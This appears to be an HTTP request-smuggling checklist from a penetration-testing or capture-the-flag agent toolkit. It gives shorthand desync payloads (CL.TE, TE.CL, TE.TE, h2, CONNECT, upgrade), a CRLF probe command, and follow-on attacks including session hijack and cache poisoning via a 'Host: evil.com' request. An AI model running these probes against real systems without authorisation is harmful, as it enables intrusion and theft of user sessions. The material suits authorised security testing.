# Desync checklist — the complete sweep

## The recon — is a proxy in the path?

- `Via:`/`X-Backend-Server:`/`X-Cache:`/`Server:` pair — `smuggle-env.md`
- `docker-compose` with `nginx`/`haproxy` + backend — `whitebox-hunt.md`
- an `Upgrade:`/`websocket`/`h2c` route — `upgrade-smuggling.md`
- an h2 listener — `http2-smuggling.md`

## The fold — does a control character survive?

```bash
python3 tools/web/crlf_probe.py --url "http://t/?host={M}" --value "ex.com"
```

`crlf-injection.md` — the fold-matrix.

## The CL.TE — the timing probe

```text
POST / CL:6 TE:chunked body=0\r\n\r\nG   →  3x → hang?
```

`detection.md`.

## The TE.CL — the 404-poison

```text
POST / CL:4 TE:chunked body=5c\r\nGET /404 ...\r\nx=1\r\n0\r\n\r\n
→ GET / → 404?
```

`detection.md`.

## The TE.TE — the obfuscation matrix

```text
For each obfuscation → the TE.CL probe → 404?
```

`obfuscation.md`.

## The CL.CL — the dup-CL

```text
POST / CL:4 CL:7 body=A=1&B=2
```

`cl-manipulation.md`.

## The CL.0 — the body-ignored

```text
POST /ignored CL:60 body=GET /marker
```

`client-side-desync.md`.

## The upgrade — `Upgrade: ws` / `h2c`

```text
GET /ws Upgrade:websocket
GET / Upgrade:h2c HTTP2-Settings:...
```

`upgrade-smuggling.md`.

## The CONNECT — `CONNECT internal:80`

```text
CONNECT internal:80 HTTP/1.1
```

`tunneling.md`.

## The h2 — `content-length:0` / `transfer-encoding:chunked`

```text
:method POST :path / content-length 0
:method POST :path / transfer-encoding chunked
```

`http2-smuggling.md`.

## The pipelining — `GET /a + GET /b` one socket

```text
GET /a HTTP/1.1 Host: t

GET /b HTTP/1.1 Host: t
```

`http-pipelining.md`.

## The exploit — the smuggle's target

- `GET /admin` / `GET /flag` — `internal-routes.md`
- `POST /store CL:400 body=x=` — `session-hijack.md`
- `GET /?cb=xyz Host: evil.com` — `cache-poison-via-smuggle.md`
- `GET /admin Host: internal` — `virtual-host.md`

## The readback — the output

- self-poison `GET /` — `response-poisoning.md`
- stored-param — `session-hijack.md`
- echo — `smuggle-readback.md`
- OOB — `blind-smuggle.md`
- deferred — `webhook-deferred.md`

## The evidence — the verbatim excerpt

```bash
python3 tools/hooks.py post-probe <name> --request "..." \
  --verdict confirms --evidence-kind class --class web-request-smuggling \
  --hypothesis-id h1 --evidence "<excerpt>" --response "<raw>"
```

`evidence-rules.md`.

## The budget — 5/15/25/45

`AGENTS.md` — the escalation order.
